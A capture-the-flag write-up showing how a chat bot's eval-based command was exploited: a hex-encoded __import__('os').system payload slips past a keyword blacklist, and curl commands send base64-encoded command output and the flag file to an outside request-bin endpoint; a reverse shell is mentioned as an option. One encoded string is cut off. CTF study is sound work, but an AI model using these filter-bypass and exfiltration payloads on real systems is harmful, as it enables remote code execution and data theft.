# Solve

- We notice quite quickly that a blacklist filtering prevent us from executing classic payloads using 'import', 'os' etc.
- We can, for instance, go through some form of encoding to hide the payload (like hexadecimal encoding) to prevent them from being detected by the filter :
- Luckily for us, it's possible to write an hexa string directly in Python as long as e precede each character with '\x' (the string does not contain ';' or line breaks prohibited by the 'eval function) :

```__import__('os').system('ls')
```

becomes :


```'\x5f\x5f\x69\x6d\x70\x6f\x72\x74\x5f\x5f\x28\x27\x6f\x73\x27\x29\x2e\x73\x79\x>
```



We can then give this string to 'eval' to execute it :

```!monkey order eval('\x5f\x5f\x69\x6d\x70\x6f\x72\x74\x5f\x5f\x28\x27\x6f\x73\x27\x29\x2e\x73\x79\x73\x74\x65\x6d\x28\x27\x60\x6c\x73\x27\x29')```

It gives the following result :

```You just ordered 0 bananas!```

- Unfortunately, we do not have access to the result of the command but only to its return code (0 in case of good execution). To get access to the command's output we can try to exfiltrate it with an http endpoint which can be an handmade website or to go faster a requestbin.com endpoint. We can imagine a payload like this :

```__import__('os').system('curl https://yourendpoint.x.pipedream.net?payload=`ls | base64`')```

-> We can get the output of the requestbin command by decoding the GET argument from the request. We get then a strange folder which contains the flag. We create the final payload :

```__import__('os').system('curl https://yourendpoint.x.pipedream.net?payload=`cat 4a5566104e7e692983399d5843f2665f/flag.txt| base64`')```

Note : It was also of course possible to get a reverse shell on the machine by encoding the classic payloads to succeed!
